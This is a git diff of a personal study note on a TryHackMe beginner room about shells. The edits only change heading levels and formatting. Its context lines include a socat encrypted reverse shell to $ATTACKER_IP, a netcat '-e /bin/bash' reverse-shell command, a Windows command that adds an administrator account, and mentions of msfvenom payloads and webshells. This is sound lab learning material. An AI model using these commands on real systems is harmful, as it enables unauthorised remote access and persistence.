@@ -1,11 +1,11 @@
 # TryHackMe: Complete Beginner
 
-author:: Nathan Acks  
-date:: 2021-10-28
+**author**:: Nathan Acks  
+**date**:: 2021-10-28
 
-# What the Shell?
+## What the Shell?
 
-## Socat Encrypted Shells
+### Socat Encrypted Shells
 
 Socat can also make encrypted connections, which foil after-the-fact network analysis and may circumvent IDS entirely.
 
@@ -65,7 +65,7 @@ OPENSSL:$ATTACKER_IP:$LISTENER_PORT,verify=0 \
 EXEC:"/bin/bash -li",pty,stderr,sigint,setsid,sane
 ```
 
-## Common Shell Payloads
+### Common Shell Payloads
 
 Pre-compiled, statically-linked Windows binaries for red teaming can be found in /usr/share/windows-binaries.
 
@@ -90,7 +90,7 @@ Note that `<IP>` and `<PORT>` need to be appropriately replaced in the above cod
 * [2021-10-02 - TryHackMe: Complete Beginner](2021-10-02-tryhackme-complete-beginner.md)
 * [PayloadsAllTheThings Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-## msfvenom
+### msfvenom
 
 Definitions:
 
@@ -113,11 +113,11 @@ List all available payloads using `msfvenom --list payloads`.
 
 Interestingly, Metasploit/Meterpeter shells are banned from som certification examinations. I guess because they're just too powerful.
 
-## Metasploit Multi/Handler
+### Metasploit Multi/Handler
 
 Be sure to set the right PAYLOAD when using multi/handler!
 
-## WebShells
+### WebShells
 
 Webshells are shells that run within a webserver, typically receiving input via GET variables or a form, and outputting to the page HTML. So, the simplest (PHP) web shell might be:
 
@@ -131,7 +131,7 @@ Web shells are, by their nature, non-interactive.
 
 Check out /usr/share/webshells on Kali Linux for some example webshells. In general, the most capable webshells only work on UNIX-like systems. For Windows systems, webshells are normally only a stepping stone to a normal reverse shell.
 
-## Next Steps
+### Next Steps
 
 Adding a user on Windows (once you have access to SYSTEM or an administrator account):
 
@@ -142,7 +142,7 @@ net localgroup administrators $USERNAME /add
 
 In general, you don't want to stay in reverse-shell land any longer than you have to.
 
-## Linux Practice Box
+### Linux Practice Box
 
 > Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.
 
@@ -180,7 +180,7 @@ Catch it with netcat or socat.
 * [Using "netcat"](../notes/netcat.md)
 * [Using "socat"](../notes/socat.md)
 
-## Windows Practice Box
+### Windows Practice Box
 
 > Try uploading and activating the `php-reverse-shell`. Does this work?
 
